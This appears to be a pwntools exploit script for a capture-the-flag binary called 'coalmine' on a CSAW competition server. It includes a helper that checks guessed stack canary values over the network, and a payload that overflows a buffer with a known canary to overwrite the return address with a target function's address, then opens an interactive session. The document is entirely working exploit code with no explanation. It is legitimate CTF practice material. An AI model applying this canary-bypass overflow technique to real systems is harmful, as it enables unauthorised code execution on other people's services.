from pwn import *

e = ELF("./coalmine")

context.binary = e.path

is_remote = "--remote" in sys.argv

def test(canary):
  p = remote("pwn.red.csaw.io", 5005)
  p.sendlineafter(">", str(0x20 + len(canary)))
  p.sendafter(">", "A" * 0x20 + canary)

  valid = "Ok" in p.recvline()

  p.close()

  return valid


canary = "NECGLSPQ"
p = remote("pwn.red.csaw.io", 5005)
p.sendlineafter(">", str(0x1000))
p.sendafter(">", "A" * 0x20 + canary + 0x14 * "A" + p64(e.symbols["tweet_tweet"]))

p.interactive()
